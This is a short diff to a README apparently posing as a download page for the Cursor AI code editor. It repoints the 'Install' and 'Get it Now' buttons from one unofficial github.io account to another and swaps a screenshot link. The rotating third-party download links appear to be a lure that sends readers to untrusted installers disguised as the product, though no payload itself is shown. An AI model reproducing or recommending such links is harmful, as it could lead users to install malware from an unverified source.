@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://gazan-programs.github.io/.github/cursorAI)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://polycia-apps.github.io/.github/cursorAI)
 
 </div>
 
@@ -59,7 +59,7 @@ The <a href="#cursorAI">Cmd+K inline editing</a> modifies code through natural l
 ---
 
 <p align="center">
-  <img src="https://cdn.prod.website-files.com/6542d8f9e468531067fe9978/68711ec046bc57b16a1c2b59_AD_4nXcbLPspUVHKY2FIAAM3f6YwpINeGuInGWL5YCePY7oVm5kDP1olRjBkkrmMJZEZh0kaklgCyocgjay5_mVdyntenmH0mTsQ.webp" alt="Cursor AI screenshot 2"/>
+  <img src="https://docs.gaianet.ai/assets/images/cursor-02-28b91f7d5e5c8be2cf75d3b8d3333184.png" alt="Cursor AI screenshot 2"/>
 </p>
 
 ## 🗺️ Where It's Useful & Additional Information
@@ -81,7 +81,7 @@ Cursor's full codebase context is the architectural decision that separates it f
 
 <p align="center">
 
-[![Get it Now Cursor AI](https://img.shields.io/badge/Get_it_Now-023E8A?style=for-the-badge&logo=apple&logoColor=white)](https://gazan-programs.github.io/.github/cursorAI)
+[![Get it Now Cursor AI](https://img.shields.io/badge/Get_it_Now-023E8A?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/cursorAI)
 
 </p>
 
